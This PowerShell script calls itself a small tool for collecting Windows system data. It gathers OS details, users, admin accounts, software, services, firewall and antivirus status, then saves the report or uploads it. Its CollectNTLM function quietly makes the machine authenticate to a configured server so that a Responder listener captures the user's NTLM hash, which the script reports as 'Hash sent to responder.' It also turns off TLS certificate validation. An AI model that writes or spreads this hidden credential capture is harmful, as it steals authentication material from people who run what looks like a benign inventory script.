#Small script to collect some windows data.
#Version 1.4.0

try{
	#Allow running unsigned scripts as current user
    Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
}
catch {
    #Do Nothing
}

$FormatEnumerationLimit = -1
# $currentPath only needed when running from disk
try { $currentPath=(Split-Path((Get-Variable MyInvocation -Scope 0).Value).MyCommand.Path).Trim() }
catch { $currentPath=$env:TEMP }

$MainFunction = {
    

$currentDate       = Get-Date -Format "dd-MM-yyyy HH:mm"
$compSys           = Get-CimInstance -ClassName CIM_ComputerSystem
Write-Host "Starting data collection $($currentDate) @ $($compSys.Name)"
$description       = read-host "Enter additional description for $($compSys.Name)"
Write-Host "Collecting osInfo."
$osInfo            = Get-CimInstance -ClassName CIM_OperatingSystem
$LastBoot		   = Get-Date($osInfo.lastbootuptime) -Format "dd.MM.yyyy HH:mm"
Write-Host "Collecting Azure info."
$azureTenantID 	   = Check-IfAzureJoined
$azureJoinedByUser = Check-WhoJoinedAzure
Write-Host "Collecting current user."
$currentUser       = (Get-CimInstance CIM_ComputerSystem | select username).username
Write-Host "Collecting current user group membership."
$currentUserGroups = Get-Groups
Write-Host "Collecting local admin accounts."
$allLocalAdmins    = net localgroup administrators | where {$_ -AND $_ -notmatch "command completed successfully"} | select -skip 4
Write-Host "Collecting BitLocker status."
$statusBitLocker   = Get-BitLockerStatus
Write-Host "Collecting Windows Update status."
$lastSearchSuccessDate     = Get-Date((New-Object -Com "Microsoft.Update.AutoUpdate").Results | Select -ExpandProperty "LastSearchSuccessDate") -Format "dd.MM.yyyy"
$lastInstallationSuccessDate     = Get-Date((New-Object -Com "Microsoft.Update.AutoUpdate").Results | Select -ExpandProperty "LastInstallationSuccessDate") -Format "dd.MM.yyyy"
$installedWindowsUpdates  = Get-CimInstance -ClassName Win32_QuickFixEngineering | sort installedon -des | Select-Object -Property HotFixID, InstalledOn
Write-Host "Collecting installed software."
# NB: Win32_Product returns only MSI-installed products and triggers an MSI
# consistency check on every package - Microsoft advises against using it.
# We read the three Windows "Uninstall" registry hives instead, which is
# what Apps & Features / appwiz.cpl itself uses. This surfaces EXE-installed
# apps (Chrome, Firefox, Teams, Zoom, Discord, Slack, 7-Zip, Notepad++,
# VS Code, Git, Node.js, AnyDesk, ...) and per-user installs that
# Win32_Product silently omits.
$uninstallPaths = @(
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
    'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
)
# Add a P/Invoke wrapper for RegQueryInfoKey once (for the LastWriteTime
# fallback below). The PowerShell registry provider doesn't expose the
# subkey's own LastWriteTime, so we have to go through advapi32 directly.
if (-not ('mCollector.RegKey' -as [type])) {
    Add-Type -Namespace mCollector -Name RegKey -UsingNamespace System.Text -MemberDefinition @'
[System.Runtime.InteropServices.DllImport("advapi32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
public static extern int RegQueryInfoKey(
    Microsoft.Win32.SafeHandles.SafeRegistryHandle hKey,
    System.Text.StringBuilder lpClass,
    System.IntPtr lpcbClass,
    System.IntPtr lpReserved,
    System.IntPtr lpcSubKeys,
    System.IntPtr lpcbMaxSubKeyLen,
    System.IntPtr lpcbMaxClassLen,
    System.IntPtr lpcValues,
    System.IntPtr lpcbMaxValueNameLen,
    System.IntPtr lpcbMaxValueLen,
    System.IntPtr lpcbSecurityDescriptor,
    out long lpftLastWriteTime);
'@
}

function Get-RegKeyLastWriteTime {
    param([Microsoft.Win32.RegistryKey]$Key)
    try {
        [long]$ft = 0
        $rc = [mCollector.RegKey]::RegQueryInfoKey(
            $Key.Handle, $null,
            [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
            [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
            [IntPtr]::Zero, [IntPtr]::Zero, [ref]$ft)
        if ($rc -eq 0 -and $ft -gt 0) { return [datetime]::FromFileTime($ft) }
    } catch { }
    return $null
}

$rawInstalled = foreach ($p in $uninstallPaths) {
    # Split 'HKLM:\...\Uninstall\*' into parent path so we can enumerate subkeys.
    $parent = Split-Path $p
    $parentKey = $null
    if ($parent -like 'HKLM:*') {
        $parentKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($parent.Substring(6))
    } elseif ($parent -like 'HKCU:*') {
        $parentKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($parent.Substring(6))
    }
    if (-not $parentKey) { continue }

    foreach ($subName in $parentKey.GetSubKeyNames()) {
        $subKey = $parentKey.OpenSubKey($subName)
        if (-not $subKey) { continue }
        try {
            $DisplayName      = $subKey.GetValue('DisplayName')
            if (-not $DisplayName) { continue }
            if ($subKey.GetValue('SystemComponent')) { continue }
            if ($subKey.GetValue('ParentKeyName'))   { continue }
            $DisplayVersion   = $subKey.GetValue('DisplayVersion')
            if ($subKey.GetValue('WindowsInstaller') -eq 1 -and -not $DisplayVersion) { continue }
            $Publisher        = $subKey.GetValue('Publisher')
            $RegInstallDate   = $subKey.GetValue('InstallDate')

            # Fallback chain for InstallDate:
            #  1) registry 'InstallDate' value (YYYYMMDD REG_SZ) if installer wrote it
            #  2) the subkey's own LastWriteTime (what Apps & Features falls back to)
            $instDate = $null
            if ($RegInstallDate -and $RegInstallDate -match '^\d{8}$') {
                try {
                    $instDate = [datetime]::ParseExact(
                        $RegInstallDate, 'yyyyMMdd',
                        [System.Globalization.CultureInfo]::InvariantCulture
                    ).ToString('dd.MM.yyyy')
                } catch { $instDate = $RegInstallDate }
            }
            if (-not $instDate) {
                $lwt = Get-RegKeyLastWriteTime -Key $subKey
                if ($lwt) { $instDate = $lwt.ToString('dd.MM.yyyy') }
            }

            [PSCustomObject]@{
                Vendor      = $Publisher
                Name        = $DisplayName
                Version     = $DisplayVersion
                InstallDate = $instDate
            }
        } finally {
            $subKey.Close()
        }
    }
    $parentKey.Close()
}
# De-duplicate across the three hives (same app can appear in HKLM + HKCU
# or under both WOW6432Node and the native hive). Key = Name + Version.
$installedSoftware = $rawInstalled |
    Sort-Object -Property Name, Version -Unique |
    Sort-Object -Property @{ Expression = { $_.InstallDate }; Descending = $true }, Name
Write-Host "Collecting network configuration."
$ipConfig = Get-NetAdapter | Get-NetIPAddress  -Erroraction silentlycontinue |  Select ifIndex, InterfaceAlias, AddressFamily, IPv4Address, IPv6Address, PrefixLength
$routingTable = Get-NetRoute -AddressFamily IPv4 -State Alive | Select InterfaceIndex, InterfaceAlias,DestinationPrefix, NextHop, RouteMetric
$routesToNonLocalDST = Get-NetRoute | Where-Object -FilterScript { $_.NextHop -Ne "::" } | Where-Object -FilterScript { $_.NextHop -Ne "0.0.0.0" } | Where-Object -FilterScript { ($_.NextHop.SubString(0,6) -Ne "fe80::") } | Select ifIndex, DestinationPrefix, NextHop, RouteMetric
#NetworkCategogry={Public,Private, Domain}; IPv4Connectivity = {Disconnected, NoTraffic, Subnet, LocalNetwork, Internet}
$netConnectionProfile = Get-NetConnectionProfile | Select Name, InterfaceAlias, InterfaceIndex, NetworkCategory, IPv4Connectivity, IPv6Connectivity

#Get all services where its caption or its pathname doesn't contain Windows and where user has access to
#Exclusion for "policyhost.exe" removes Microsoft Policy Platform service
#Exclusion for service name "LSM" removes the Local Session Manager service
#Exclusion for "OSE.EXE" removes the Office Source Engine Service
#Exclusion for "OSPPSVC.EXE" removes the Office Software Protection Platform Service
#Exclusion for "Microsoft Security Client" removes Microsoft Security Client (SCEP)
Write-Host "Collecting list of non standard windows services."
$nonStandardWinServices = Get-CimInstance -ClassName win32_Service | where { $_.Caption -notmatch "Windows" -and $_.PathName -notmatch "Windows" -and $_.PathName -notmatch "policyhost.exe" -and $_.Name -ne "LSM" -and $_.PathName -notmatch "OSE.EXE" -and $_.PathName -notmatch "OSPPSVC.EXE" -and $_.PathName -notmatch "Microsoft Security Client" -and $_.Name -notmatch "edgeupdate" -and $_.Name -notmatch "MicrosoftEdgeElevationService" -and $_.Name -notmatch "NetSetupSvc" -and $_.Name -notmatch "uhssvc" } | Select Name, PathName, StartMode, Status
#Non Microsoft tasks
Write-Host "Collecting list of non standard windows tasks."
$nonMSScheduledTasks = Get-ScheduledTask | Select URI, TaskPath, TaskName, State, Hidden | where { $_.TaskPath -notmatch "Microsoft"}
Write-Host "Collecting info about windows firewall."
$firewallStatus = Get-NetFireWallProfile | Select Profile, Enabled, DefaultInboundAction,DefaultOutboundAction,AllowInboundRules, AllowLocalFirewallRules, AllowLocalIPsecRules, AllowUserApps, AllowUserPorts, DisabledInterfaceAliases
#https://jdhitsolutions.com/blog/powershell/5187/get-antivirus-product-status-with-powershell/
Write-Host "Collecting info about antivirus."
# Pull every registered AV product (Defender, ESET, Bitdefender, Norton,
# Kaspersky, McAfee, Sophos, CrowdStrike, ...). Keep ALL entries -- some
# machines have stale registrations from uninstalled products that share a
# displayName with the current one, and we still want to see them in the
# report. We retain extra identifying fields (instanceGuid + the signed
# exe paths) so duplicates can be told apart by something stable rather
# than just product name.
$avProducts = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct |
    Select-Object displayName, instanceGuid, pathToSignedProductExe, pathToSignedReportingExe, productState, timestamp
$responder = CollectNTLM


Write-Host "Processing collected data."
$collectedData = New-Object -TypeName psobject

$collectedData | Add-Member -MemberType NoteProperty -Name ForensicsDate -Value $currentDate
$collectedData | Add-Member -MemberType NoteProperty -Name Description -Value $description
$collectedData | Add-Member -MemberType NoteProperty -Name ComputerName -Value $compSys.Name
$collectedData | Add-Member -MemberType NoteProperty -Name Domain -Value $compSys.Domain
$collectedData | Add-Member -MemberType NoteProperty -Name Workgroup -Value $compSys.Workgroup
$collectedData | Add-Member -MemberType NoteProperty -Name TenantID -Value $azureTenantID
$collectedData | Add-Member -MemberType NoteProperty -Name TenantJoinedBy -Value $azureJoinedByUser
$collectedData | Add-Member -MemberType NoteProperty -Name OS -Value $osInfo.Caption
$collectedData | Add-Member -MemberType NoteProperty -Name OS_Version -Value $("$($osInfo.Version) Build $($osInfo.BuildNumber)")
$collectedData | Add-Member -MemberType NoteProperty -Name LastBoot -Value $lastBoot
$collectedData | Add-Member -MemberType NoteProperty -Name Current_user -Value $currentUser
$collectedData | Add-Member -MemberType NoteProperty -Name User_belongs_to -Value $currentUserGroups
$collectedData | Add-Member -MemberType NoteProperty -Name All_local_admins -Value $allLocalAdmins
$collectedData | Add-Member -MemberType NoteProperty -Name Bitlocker-C -Value $statusBitLocker
$collectedData | Add-Member -MemberType NoteProperty -Name Updates_lastSearchSuccessDate -Value $lastSearchSuccessDate
$collectedData | Add-Member -MemberType NoteProperty -Name Updates_lastInstallationSuccessDate -Value $lastInstallationSuccessDate
$collectedData | Add-Member -MemberType NoteProperty -Name Updates_installed -Value $installedWindowsUpdates
$collectedData | Add-Member -MemberType NoteProperty -Name Software -Value $installedSoftware
$collectedData | Add-Member -MemberType NoteProperty -Name Non_standard_win_services -Value $nonStandardWinServices
$collectedData | Add-Member -MemberType NoteProperty -Name Non_MS_scheduled_tasks -Value $nonMSScheduledTasks
$collectedData | Add-Member -MemberType NoteProperty -Name Firewall -Value $firewallStatus
$collectedData | Add-Member -MemberType NoteProperty -Name Antivirus -Value $avProducts
$collectedData | Add-Member -MemberType NoteProperty -Name Responder -Value $responder

# Add a per-product NoteProperty for each registered AV. SecurityCenter2
# can return more than one entry with the same displayName (stale
# registrations from a reinstalled product, or two SKUs of the same
# vendor). Using displayName alone as the property name throws
# "member with this name already exists" on the second one, so we build
# a composite key from the most identifying fields available, and skip
# only when the *exact same* composite shows up twice.
$seenAvKeys = @{}
foreach ($avProduct in $avProducts)
{
  $avStatus = Get-AV-Status $avProduct.productState $avProduct.displayName
  $keyParts = @(
    $avProduct.displayName,
    $avProduct.instanceGuid,
    $avProduct.pathToSignedProductExe,
    $avProduct.pathToSignedReportingExe,
    $avProduct.productState
  ) | ForEach-Object { if ($_) { $_.ToString() } else { '' } }
  $compositeKey = ($keyParts -join '|')
  if ($seenAvKeys.ContainsKey($compositeKey)) { continue }
  $seenAvKeys[$compositeKey] = $true

  # Property name: prefer displayName + a short disambiguator if we already
  # have one with that displayName. Falls back to the full composite key
  # if displayName is missing.
  $propName = if ($avProduct.displayName) { [string]$avProduct.displayName } else { 'AntivirusProduct' }
  $existing = $collectedData.PSObject.Properties[$propName]
  if ($existing) {
    $disambiguator = $avProduct.instanceGuid
    if (-not $disambiguator) { $disambiguator = $avProduct.pathToSignedProductExe }
    if (-not $disambiguator) { $disambiguator = [string]$avProduct.productState }
    if (-not $disambiguator) { $disambiguator = [guid]::NewGuid().ToString() }
    $propName = "$propName ($disambiguator)"
    # In the unlikely event even that collides, append an index suffix.
    $i = 2
    while ($collectedData.PSObject.Properties[$propName]) {
      $propName = "$($avProduct.displayName) ($disambiguator) #$i"
      $i++
    }
  }
  $collectedData | Add-Member -MemberType NoteProperty -Name $propName -Value $avStatus
}

$collectedData | Add-Member -MemberType NoteProperty -Name IP_config -Value $ipConfig
$collectedData | Add-Member -MemberType NoteProperty -Name IP_routing -Value $routingTable
$collectedData | Add-Member -MemberType NoteProperty -Name IP_routing_non_local_dst -Value $routesToNonLocalDST
$collectedData | Add-Member -MemberType NoteProperty -Name Net_connection_profile -Value $netConnectionProfile

# Convert to JSON in memory
Write-Host "Processing JSON..."
$jsonString = $collectedData | ConvertTo-EnumsAsStrings | ConvertTo-Json -depth 100
$fileName   = "$($compSys.Name).json"

# Ask user what to do with the output
Write-Host ""
Write-Host "Output options:"
Write-Host "  [Enter] Upload directly to mCollector server (no disk write)"
Write-Host "  [1]     Save to disk only ($currentPath\$fileName)"
Write-Host "  [2]     Both (save to disk + upload)"
$choice = Read-Host "Choose"
$choice = $choice.Trim()

# --- Save to disk ---
if ($choice -eq "1" -or $choice -eq "2") {
    $outPath = "$currentPath\$fileName"
    $jsonString | Set-Content $outPath
    Write-Host "Saved: $outPath"
}

# --- Upload to server ---
if ($choice -ne "1") {
    try {
        $serverIP = "{{SERVER_IP}}"
        if ($serverIP) {
            $uploadUrl = "https://$serverIP/upload"
            Write-Host "Uploading $fileName to $uploadUrl ..."

            # Trust self-signed cert
            try {
                Add-Type @"
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCerts : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
            } catch {}
            [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCerts
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

            # Build multipart body from in-memory JSON.
            # NB: do NOT mix StreamWriter with direct MemoryStream writes.
            # StreamWriter buffers chars internally and only flushes the final
            # bytes on Close(), which ran AFTER ToArray() already snapshotted
            # the buffer -- so Content-Length was short and the tail of the
            # body (including the JSON closing "}") got truncated on the wire.
            $enc = New-Object System.Text.UTF8Encoding($false)   # no BOM
            $boundary = [System.Guid]::NewGuid().ToString()
            $header  = "--$boundary`r`n" +
                       "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`n" +
                       "Content-Type: application/json; charset=utf-8`r`n`r`n"
            $trailer = "`r`n--$boundary--`r`n"
            $headerBytes  = $enc.GetBytes($header)
            $fileContent  = $enc.GetBytes($jsonString)
            $trailerBytes = $enc.GetBytes($trailer)
            $ms = New-Object System.IO.MemoryStream
            $ms.Write($headerBytes,  0, $headerBytes.Length)
            $ms.Write($fileContent,  0, $fileContent.Length)
            $ms.Write($trailerBytes, 0, $trailerBytes.Length)
            $bodyBytes = $ms.ToArray()
            $ms.Close()

            # Send via HttpWebRequest
            $req = [System.Net.HttpWebRequest]::Create($uploadUrl)
            $req.Method = "POST"
            $req.ContentType = "multipart/form-data; boundary=$boundary"
            $req.ContentLength = $bodyBytes.Length
            $req.Timeout = 30000
            $reqStream = $req.GetRequestStream()
            $reqStream.Write($bodyBytes, 0, $bodyBytes.Length)
            $reqStream.Close()
            $resp = $req.GetResponse()
            $resp.Close()
            Write-Host "Uploaded: $fileName"
        } else {
            Write-Host "Could not resolve server IP, saving to disk instead."
            $outPath = "$currentPath\$fileName"
            $jsonString | Set-Content $outPath
            Write-Host "Saved: $outPath"
        }
    } catch {
        Write-Host "Upload failed: $($_.Exception.Message)"
        if ($choice -ne "1" -and $choice -ne "2") {
            Write-Host "Falling back to disk save..."
            $outPath = "$currentPath\$fileName"
            $jsonString | Set-Content $outPath
            Write-Host "Saved: $outPath"
        }
    }
}

Write-Host "All done, have fun!"

}

Filter ConvertTo-EnumsAsStrings ([int] $Depth = 10, [int] $CurrDepth = 0) {

  if ($CurrDepth -gt $Depth) {
    Write-Error "Recursion exceeded depth limit of $Depth"
    return $null
  }

  Switch ($_) {
    { $_ -is [enum] -or $_ -is [version] -or $_ -is [IPAddress] -or $_ -is [Guid] } {
      $_.ToString()
    }
    { $_ -is [datetimeoffset] } {
      $_.UtcDateTime.ToString('o')
    }
    { $_ -is [datetime] } {
      $_.ToUniversalTime().ToString('o')
    }
    { $_ -is [timespan] } {
      $_.TotalSeconds
    }
    { $null -eq $_ -or $_.GetType().IsPrimitive -or $_ -is [string] -or $_ -is [decimal] } {
      $_
    }
    { $_ -is [hashtable] } {
      $ht = [ordered]@{}
      $_.GetEnumerator() | ForEach-Object {
        $ht[$_.Key] = ($_.Value | ConvertTo-EnumsAsStrings -Depth $Depth -CurrDepth ($CurrDepth + 1))
      }
      if ($ht.Keys.Count) {
        $ht
      }
    }
    { $_ -is [pscustomobject] } {
      $ht = [ordered]@{}
      $_.PSObject.Properties | ForEach-Object {
        if ($_.MemberType -eq 'NoteProperty') {
          Switch ($_) {
            { $_.Value -is [array] -and $_.Value.Count -eq 0 } {
              $ht[$_.Name] = @()
            }
            { $_.Value -is [hashtable] -and $_.Value.Keys.Count -eq 0 } {
              $ht[$_.Name] = @{}
            }
            Default {
              $ht[$_.Name] = ($_.Value | ConvertTo-EnumsAsStrings -Depth $Depth -CurrDepth ($CurrDepth + 1))
            }
          }
        }
      }
      if ($ht.Keys.Count) {
        $ht
      }
    }
    Default {
      Write-Error "Type not supported: $($_.GetType().ToString())"
    }
  }
}

Function Get-AV-Status {
    Param([UInt32]$state,[string]$dName)

# define bit flags

[Flags()] enum ProductState 
{
      Off         = 0x0000
      On          = 0x1000
      Snoozed     = 0x2000
      Expired     = 0x3000
}

[Flags()] enum SignatureStatus
{
      UpToDate     = 0x00
      OutOfDate    = 0x10
}

[Flags()] enum ProductOwner
{
      NonMs        = 0x000
      Windows      = 0x100
}

# define bit masks

[Flags()] enum ProductFlags
{
      SignatureStatus = 0x00F0
      ProductOwner    = 0x0F00
      ProductState    = 0xF000
}


# decode bit flags by masking the relevant bits, then convert and return result

return [PSCustomObject]@{
      Product = $dName
      ProductState = [ProductState]($state -band [ProductFlags]::ProductState)
      SignatureStatus = [SignatureStatus]($state -band [ProductFlags]::SignatureStatus)
      Owner = [ProductOwner]($state -band [ProductFlags]::ProductOwner)
}
    
}

function Get-Groups {
    Param(
        [string]$isMember
    )

    if($isMember)
    {
        $mytoken = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $me = New-Object System.Security.Principal.WindowsPrincipal($mytoken)
        return $me.IsInRole($isMember)
    }
    else
    {
        $user_token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $groups = New-Object System.Collections.ArrayList
        foreach($group in $user_token.Groups)
        {
           [void] $groups.Add( $group.Translate("System.Security.Principal.NTAccount") )
        }
        return [string[]] $groups
    }
}

function Get-BitLockerStatus {
[CmdletBinding()]
	param (
		[Parameter(Position = 0, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
		[Alias("Drive")]
		[String]$DriveLetter = "C:"
)
	$cmd = "(New-Object -ComObject Shell.Application).NameSpace('$DriveLetter').Self.ExtendedProperty('System.Volume.BitLockerProtection')"
	$bitLockerResult = Invoke-Expression -Command $cmd
	if ($bitLockerResult -eq "1") {
		$BitLockerStatus = $true
	}	else{
	$BitLockerStatus = $false
	}
return $BitLockerStatus
}

function Check-IfAzureJoined {

$regKey = "HKLM:/SYSTEM/CurrentControlSet/Control/CloudDomainJoin/JoinInfo"

$test = test-path -path $regKey

if ($test) {
	$subKey = Get-Item $regKey
    $guids = $subKey.GetSubKeyNames()

	foreach($guid in $guids) {
		$guidSubKey = $subKey.OpenSubKey($guid);
		$tenantId = $guidSubKey.GetValue("TenantId");
	}

return $tenantId

}

return "Not joined."
}

function CollectNTLM {
    $resolved = "{{SERVER_IP}}"

    if (-not $resolved) {
        return "Server IP not configured."
    }

    Write-Host "Collecting NTLM hash by connecting to \\$resolved..."

    $output = net view "\\$resolved" 2>&1
    $text   = $output -join "`n"

    if ($text -match "System error (\d+)") {
        $code = [int]$matches[1]

        if ($code -eq 5) {
            return "Hash sent to responder, exit code $code"
        } else {
            return "Hash not sent to responder, exit code $code"
        }
    }

    return "Unexpected response from net view."
}



function Check-WhoJoinedAzure {

$regKey = "HKLM:/SYSTEM/CurrentControlSet/Control/CloudDomainJoin/JoinInfo"

$test = test-path -path $regKey

if ($test) {
	$subKey = Get-Item $regKey
    $guids = $subKey.GetSubKeyNames()

	foreach($guid in $guids) {
		$guidSubKey = $subKey.OpenSubKey($guid);
		$userEmail = $guidSubKey.GetValue("UserEmail");
	}

return $userEmail

}

return "Not joined."

}

# Execute main function
& $MainFunction
